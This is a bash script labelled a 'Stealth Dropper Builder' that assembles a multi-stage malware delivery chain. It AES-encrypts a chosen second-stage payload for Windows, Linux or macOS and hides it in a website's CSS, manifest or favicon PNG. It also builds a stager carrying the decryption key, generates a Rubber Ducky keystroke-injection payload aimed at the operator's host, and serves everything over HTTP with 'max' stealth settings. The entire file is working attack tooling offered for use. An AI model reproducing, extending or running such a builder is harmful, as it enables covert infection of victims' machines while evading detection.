#!/bin/bash

# === Stealth Dropper Builder (2025 Edition) ===
set -e
PROJECT_DIR=$(pwd)
cd "$PROJECT_DIR"

CONFIG_FILE="config/settings.json"
OUTPUT_DIR="output"
WEB_DIR="web"
ENCODED_FILE="$OUTPUT_DIR/encrypted_stage2.txt"
FINAL_STAGE1="$OUTPUT_DIR/final_stage1.ps1"
DUCKY_FILE="$OUTPUT_DIR/ducky_payload.txt"

mkdir -p "$OUTPUT_DIR"

# === Auto-discover local IPs ===
echo "[*] Available local IP addresses:"
ip_list=($(hostname -I))
for i in "${!ip_list[@]}"; do echo "  [$i] ${ip_list[$i]}"; done
read -p "[*] Choose IP [index]: " ip_index
IP=${ip_list[$ip_index]}
read -p "[*] Enter PORT (default 8000): " PORT
PORT=${PORT:-8000}

# === Select OS and Payload ===
echo "[*] Choose target OS:"
select OS in windows linux mac; do break; done

echo "[*] Choose payload in payloads/$OS/:"
PAYLOADS=$(find payloads/$OS -mindepth 1 -maxdepth 1 -type d -exec basename {} \;)
select PAYLOAD in $PAYLOADS; do break; done

echo "[*] Choose delivery method (recommended: css):"
select DELIVERY in css manifest png; do break; done

# === Set paths ===
PAYLOAD_DIR="payloads/$OS/$PAYLOAD"
STAGE2_RAW="$PAYLOAD_DIR/raw.ps1"
STAGER_FILE="stagers/powershell/template.ps1"

case "$OS" in
  linux)
    STAGE2_RAW="$PAYLOAD_DIR/raw.sh"
    STAGER_FILE="$PAYLOAD_DIR/template.sh"
    ;;
  mac)
    STAGE2_RAW="$PAYLOAD_DIR/raw.osascript"
    STAGER_FILE="$PAYLOAD_DIR/template.osascript"
    ;;
esac

# === Encrypt Stage 2 ===
echo "[*] Encrypting payload with AES..."
ENCODED=$(python3 tools/encrypt_aes.py "$STAGE2_RAW")
echo "$ENCODED" > "$ENCODED_FILE"

# === Embed in delivery ===
if [[ "$DELIVERY" == "css" ]]; then
  python3 tools/embed_in_css.py "$ENCODED_FILE" "$WEB_DIR/style.css"
elif [[ "$DELIVERY" == "manifest" ]]; then
  python3 tools/embed_in_manifest.py "$ENCODED_FILE" "$WEB_DIR/manifest.json"
elif [[ "$DELIVERY" == "png" ]]; then
  python3 tools/embed_in_png.py "$ENCODED_FILE" "$WEB_DIR/favicon.png" "$WEB_DIR/favicon.png"
fi

# === Build stager ===
KEY=$(grep ENCRYPTION_KEY .env | cut -d= -f2 | tr -d '\r\n')

STAGER_CONTENT=$(cat "$STAGER_FILE")
STAGER_CONTENT="${STAGER_CONTENT//REPLACE_AES/$ENCODED}"
STAGER_CONTENT="${STAGER_CONTENT//REPLACE_KEY/$KEY}"

echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
echo "[+] Final stage1 saved to $FINAL_STAGE1"

# === Copy final_stage1 to web dir for HTTP delivery ===
cp "$FINAL_STAGE1" "$WEB_DIR/final_stage1.sh"
echo "[+] Copied final_stage1.sh to $WEB_DIR"

# === Generate Ducky HID command dynamically by OS ===
echo "[*] Generating Ducky payload..."
python3 tools/generate_ducky.py "$IP" "$PORT" 1000 "$DUCKY_FILE" "$OS"
echo "[+] Ducky HID command saved to $DUCKY_FILE"

# === Start Web Server ===
cd "$WEB_DIR"
echo "[*] Serving payloads at http://$IP:$PORT"
python3 -m http.server "$PORT"

# === Save to config ===
cd "$PROJECT_DIR"
cat > "$CONFIG_FILE" <<EOF
{
  "last_used": {
    "ip": "$IP",
    "port": $PORT,
    "os": "$OS",
    "payload": "$PAYLOAD",
    "delivery": "$DELIVERY",
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  },
  "options": {
    "stealth_level": "max",
    "auto_cleanup": true,
    "log_enabled": true,
    "default_encryption": "aes-256-cbc"
  }
}
EOF
